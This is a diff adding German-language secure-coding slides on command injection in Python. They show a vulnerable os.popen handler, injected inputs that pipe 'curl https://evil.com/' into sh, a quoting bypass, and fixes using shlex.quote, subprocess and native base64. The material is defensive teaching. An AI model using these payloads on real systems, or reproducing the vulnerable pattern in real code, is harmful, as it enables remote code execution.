@@ -54,11 +54,110 @@ def vulnerable_handler(request):
 
 <section>
 <h2>Command Injection</h2>
-<pre><code class="block python">cmd = 'echo {} | base64'.format(
+<pre style="margin-bottom: 1em;"><code class="block python">cmd = 'echo {} | base64'.format(
     request.POST['message'])
 b64 = os.popen(cmd).read()</code></pre>
 
+<div>Eingabe: <code style="color:#c00;">foo bar</code></div>
+<div>⚙ Ausgeführt: <code>echo <span style="color:#c00;">foo bar</span> | base64</code></div>
 
+<div class="fragment" style="margin-top:1em;">
+<div>Eingabe: <code style="color:#c00;">|curl https://evil.com/ | sh</code></div>
+<div>⚙ <code>echo <span style="color:#c00;">|curl https://evil.com/ | sh</span> | base64</code></div>
+</div>
+</section>
+
+<section>
+<h2>Verteidigung?</h2>
+<div style="margin-bottom: 1em;"><code class="block no-highlight">cmd = <span class="hljs-string">'echo <ins>"</ins>{}<ins>"</ins> | base64'</span>.format(
+    request.POST[<span class="hljs-string">'message'</span>])
+b64 = os.popen(cmd).read()</code></div>
+
+<div>Eingabe: <code style="color:#c00;">|curl https://evil.com/|sh</code></div>
+<div>⚙ <code>echo "<span style="color:#c00;">|curl https://evil.com/|sh</span>" | base64</code></div>
+
+<div class="fragment" style="margin-top: 1em">
+<div class="insecure">Genügt nicht!</div>
+<div><code>echo "<span style="color:#c00;">"|curl https://evil.com/|sh|cat "-</span>" | base64</code></div>
+</div>
+
+<div class="fragment" style="margin-top:1em;text-align:center;font-weight:bold;">
+Achtung: Sonderzeichen (hier <code>"</code> und <code>$</code>) müssen richtig enkodiert werden!
+</div>
+</section>
+
+
+<section>
+<h2>Command Injection vermeiden</h2>
+
+<ul>
+<li><code>shlex.quote</code> verwenden</li>
+<li><code>pipes.quote</code> in Python 2</li>
+</ul>
+
+<pre style="margin-top: 1em;position:relative;"><code class="block python">import shlex
+cmd = 'echo {} | base64'.format(
+    shlex.quote(request.POST['message']))
+b64 = os.popen(cmd).read()</code><div class="correct-code" style="opacity:0.2"></div></pre>
+
+<div style="margin-top: 1.5em">Eingabe: <code style="color:#c00;">a " b $ c ' d</code><br/>
+⚙ <code>echo <span style="color:#c00;">'a " b $ c '"'"' d'</span> | base64</code>
+</div>
+
+<div class="insecure" style="margin-top:1em;text-align:center;">Aber: Sehr einfach zu vergessen!</div>
+</section>
+
+
+<section>
+<h2>Command Injection ausschließen</h2>
+
+<ul>
+<li><code>subprocess</code> verwenden!</li>
+</ul>
+
+<pre style="margin-top: .8em;position:relative;"><code class="block python">import subprocess
+b64 = subprocess.check_output(
+    ['base64'],
+    input=request.POST['message'].encode('utf-8'))
+</code>
+<div class="correct-code"></div>
+</pre>
+
+<ul style="margin-top: .5em;">
+<li>Strukturierte API, Kommandos werden als Listen übergeben</li>
+<li>secure by default</li>
+<li class="fragment" style="font-weight:bold;">Achtung vor <code>shell=True</code>!</li>
+</ul>
+</section>
+
+
+<section>
+<h2>Kommandozeile wenn möglich vermeiden!</h2>
+
+<pre style="margin-top: .8em;position:relative;"><code class="block python">import base64
+b64 = base64.b64encode(
+    request.POST['message'].encode('utf-8'))
+</code><div class="correct-code"></div></pre>
+
+<ul class="fragment" style="margin-top: 1.5em">
+<li>Bibliothek in purem Python</li>
+<li>Bindings für Bibliothek</li>
+<li>Aufruf von C-Bibliotheken mit <code>ctypes</code></li>
+</ul>
+</section>
+
+
+<section>
+<h2>Command Injection erkennen</h2>
+
+<div>Vorsicht bei Aufrufen von</div>
+
+<ul>
+<li><code>os.popen</code></li>
+<li><code>os.system</code></li>
+<li><code>subprocess.<em>*</em>(..., shell=True)</code></li>
+<li><code>pty.spawn</code></li>
+</ul>
 </section>
 
 
